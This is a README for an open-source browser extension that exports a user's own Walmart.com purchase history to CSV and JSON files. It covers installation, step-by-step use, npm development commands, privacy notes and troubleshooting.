# Walmart Personal Purchase Exporter

A free, local only Chrome and Microsoft Edge extension for exporting purchase history visible in your signed-in Walmart.com account. It has no backend, analytics, paid tier, registration, or password collection.

## Install in Chrome

1. Download the [latest source ZIP](https://github.com/gccornejo441/Walmart-Personal-Purchase-Exporter/raw/refs/heads/main/archive/refs/heads/main.zip) or download this repository ZIP and extract it.
2. Open `chrome://extensions`.
3. Turn on **Developer mode**.
4. Select **Load unpacked** and choose the extracted folder that contains `manifest.json`. For the source ZIP, open the nested `Walmart-Personal-Purchase-Exporter-main` folder.
5. Pin the extension, then visit [Walmart Purchase History](https://www.walmart.com/orders) in a tab where you are already signed in.

## Install in Microsoft Edge

1. Download and extract the [extension ZIP](https://github.com/gccornejo441/Walmart-Personal-Purchase-Exporter/raw/refs/heads/main/archive/refs/heads/main.zip).
2. Open `edge://extensions`.
3. Turn on **Developer mode**.
4. Select **Load unpacked** and choose the extracted folder containing `manifest.json`.
5. Pin the extension and open Walmart Purchase History in a signed-in tab.

## Use it, step by step

1. Open Walmart Purchase History and sign in on Walmart as you normally do. Leave that tab open.
2. Click the extension button near your browser's address bar. If you do not see it, click the puzzle piece icon and choose **Walmart Personal Purchase Exporter**.
3. In the small extension window, click **Scan purchase history**. Wait for the message that scanning is finished. If Walmart shows more history on another page or date range, open it and scan again.
4. To make a spreadsheet listing your purchases, click **Orders CSV**. This is the basic order list; it does not need item receipts first.
5. To make a spreadsheet listing the products inside each purchase, click **Fetch itemized receipts** first. Keep the extension window open while it visits orders. When it says the batch is finished, click **Items CSV**. If there are more than 25 orders, click **Fetch itemized receipts** again to continue the next batch.
6. Choose **JSON backup** if you want one file containing everything collected so far. It is a backup file rather than the regular spreadsheet.

If you click **Items CSV** before fetching any receipts, you will see: “No item receipts have been saved yet.” That means no product details have been collected yet. Click **Fetch itemized receipts**, wait for it to finish, then click **Items CSV**. Orders CSV and Items CSV are different files for different purposes.

**Dates are exported as `YYYY-MM-DD` only when the year is verified.** If Walmart shows just `Jan 31` or `Feb 5`, the purchase date stays blank until receipt details provide a full date. Orders CSV includes **Date Status** and **Original Date Text** to distinguish missing dates from partial ones. Click **Fetch itemized receipts** to repair missing or partial dates, then export Orders CSV again. Existing saved `/returns` links are automatically converted to order-detail links on load.

For an order that still has no item rows, open that order on Walmart and, if available, its printable receipt. Then click **Save current receipt** in the extension. Results are saved after each order, so completed work remains on your computer if you stop and continue later. Use **Clear data** only if you want to delete the saved purchases from this browser.

The orders CSV contains one row per order. The items CSV distinguishes a confirmed unit price and line total; where Walmart's page does not make the amount clear, those columns remain blank and the displayed amount is preserved separately. The extension does not invent missing data.

## Local development and tests

Requires Node.js 20 or newer for the fixture tests.

```sh
npm install
npm test
npm run package
```

`npm run package` creates a versioned ZIP in `releases/` on Windows with PowerShell, containing only the unpacked extension files. GitHub Actions also generates a versioned ZIP artifact on each push. The latest source ZIP from GitHub can always be loaded unpacked. Load the project folder directly during development.

## Privacy

- Purchase records are stored with `chrome.storage.local` on this browser profile.
- Data is read from Walmart pages in your current authenticated browser session. The extension never asks for or reads your password.
- No purchase data is transmitted to an external service; there are no analytics or third party calls.
- Do not commit exported CSV/JSON files, screenshots, receipts, HAR files, or account specific data. The ignore rules cover common export and receipt locations.
- Clear extension data before changing Walmart accounts on the same browser profile.

## Troubleshooting

- **Only a few orders found:** Walmart can show only part of your history behind a date range, filter, or pagination. Open other periods or pages in Purchase History and scan each one. An empty day does not necessarily mean a missing purchase.
- **Dates are blank:** Use **Date Status** and **Original Date Text** in Orders CSV to identify partial dates. Fetch itemized receipts to check the full purchase date on the order page. A month/day without a year is deliberately left blank.
- **No orders found:** Open `https://www.walmart.com/orders`, confirm the account is signed in, wait for the list to load, then scan. If Walmart separates history by pages/date filters, open each and scan.
- **Cannot read the Walmart tab:** Reload the Walmart order page after installing or updating the extension, then retry.
- **Receipt not itemized:** The page layout may not match current selectors. Open the order's printable receipt and use **Save current receipt**. Incomplete records remain saved and can be retried.
- **Sign in or verification prompt:** Resolve it on Walmart's own page. The extension pauses without attempting to bypass it.
- **Batch stopped or interrupted:** Completed orders remain saved. Reopen the popup and fetch again; unfinished orders are eligible for a later batch.
- **Some in-store transactions are missing:** Only linked transactions Walmart presents in the signed-in order history can be collected.
- **Excel formatting:** Open the CSV in Excel. The extension does not generate `.xlsx` files directly.

## Validation limits

Automated tests use representative, local HTML fixtures; they do not prove Walmart's current live markup or account-specific access. Before relying on a full export, verify in your authenticated browser that the current order list and receipt pages expose the expected data. This project does not bypass CAPTCHA, authentication, or other Walmart controls. Walmart can change its site layout or access requirements at any time.

Unofficial personal utility; not affiliated with Walmart.

## Diagnosing missing item lists

If an item batch reports **0 itemized orders**, the order pages loaded but the receipt rows may not have been rendered in the format the extension recognizes. Version 1.1.3 scrolls order details, expands item sections, recognizes product links within order item cards, and follows same-order printable receipt links when available. It will not click a Print button that opens a system print dialog.

1. Retry a batch once after updating and reloading the extension in `chrome://extensions`.
2. If no items appear, click **Diagnostics JSON**. This export contains only structural counts and statuses, not order numbers, prices, item names, or account information. Share this diagnostic JSON to guide the next fix.
3. Open a specific order manually on Walmart and select the **Print** icon to see the itemized receipt. If Walmart opens a printable page within `/orders`, click **Save current receipt** there. If the print preview is system-only, the extension cannot read the print preview directly.

A completed date does not mean the order has been successfully itemized. Look at the Itemized count separately from Date Status.
